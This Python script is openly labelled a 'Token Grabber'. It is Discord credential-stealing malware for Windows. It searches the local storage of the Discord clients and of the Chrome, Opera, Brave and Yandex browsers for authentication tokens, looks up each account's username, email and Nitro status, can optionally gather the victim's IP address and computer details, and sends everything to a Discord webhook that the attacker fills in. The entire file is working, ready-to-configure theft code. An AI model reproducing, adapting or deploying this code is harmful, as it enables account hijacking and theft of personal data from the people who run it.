# TODO add embed support

# CONFIGURATION:
# your webhook URL
WEBHOOK_URL = 'WEBHOOK HERE'
# https://rapidapi.com/ api key (sign in to get)
# only required if SEND_IP = True
API_KEY = ''
# determines what information you wanna send
SEND_IP = False
SEND_PC_INFO = False
# mentions you when you get a hit
PING_ME = False
# Style of the webhook message
# TEXT , EMBED
MODE = 'TEXT'
# only for development purposes
EXPERIMENTAL= False

'''
CHANGELOG:
- added SEND_IP and SEND_PC_INFO options
- added EMBED to MODE (not ready to use yet)
- added EXPERIMANTAL bool
- added getIP() function
- added getUserInfo() function
'''


# CODE

import os
import re
import json
import random
import platform

try:
    import requests
except:
    print("requests module not found")
    raise Exception
# if system is not Windows quit 
if not platform.system() == 'Windows':
    raise OSError

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def getUserInfo(token):
    return json.loads(requests.get('https://discord.com/api/v9/users/@me',headers={"Authorization": token,'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}).text)

def getIP():
    url = "https://api.ipify.org/"
    response = requests.request("GET", url)
    return response.text

def getPcInfo():
    userinfo = dict(
        user=os.getlogin(),
        pc_name=platform.uname().node,
        windows_ver='Windows ' + platform.release() + ' ' + platform.win32_edition() + ' ' + platform.version(),
    )
    return userinfo
    


def main():
    # check if webhook url was filled in
    # or is a webhook url
    if WEBHOOK_URL == 'WEBHOOK HERE':
        print("Please add a webhook URL")
        raise Exception
    elif not WEBHOOK_URL.startswith('https://discord.com/api/webhooks/'):
        print("This is not a discord webhook URL")
        raise Exception

    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }
    IP = None
    PC_INFO = None
    if SEND_IP:
        IP = getIP()
    if SEND_PC_INFO:
        PC_INFO = getPcInfo()

    if MODE == 'TEXT':
        message = '@everyone\n' if PING_ME else ''

        message += '**IP**\n``' + IP + '``\n' if IP else ''
        message += '**PC_INFO**\n' + f"Username: ``{PC_INFO['user']}``\nPC NAME: ``{PC_INFO['pc_name']}``\nWindows Version: ``{PC_INFO['windows_ver']}``" if PC_INFO else ''


        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message += f'\n**{platform}**\n```\n'

            tokens = find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    try:
                        message += f'{getUserInfo(token)["username"]}#{getUserInfo(token)["discriminator"]}\n'
                        message += f'{token}\n\n'
                    except:
                        pass
            else:
                message += 'No tokens found.\n'

            message += '```'

        

        payload = json.dumps({'content': message})

        try:
            requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)
        except:
            pass
    elif MODE == 'EMBED' and EXPERIMENTAL:
        embeds = []
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            tokens = find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    try:
                       color = random.randint(0, 0xFFFFFF)
                       raw_user = getUserInfo(token)
                       if raw_user['premium_type'] > 0:
                           nitro = True
                       else:
                           nitro = False
                       user = f'{getUserInfo(token)["username"]}#{getUserInfo(token)["discriminator"]}\n'
                       embed = {"title":user,'color':color,"fields":[
                           {
                               "name":'**Discord Account Info**',
                               'value':f"NAME: {user}\n EMAIL: {raw_user['email']}\nNitro: {nitro}\nCOUNTRY: {raw_user['locale']}"
                           }
                       ]}
                       embeds.append(embed)
                    except:
                        pass


        message = {"username":"Token Grabber by MegaDev","embeds":json.dumps(embeds)}

        requests.post(WEBHOOK_URL,headers=headers,data=message)
    else:
        print('MODE invalid or experimental is not enabled')
if __name__ == '__main__':
    main()
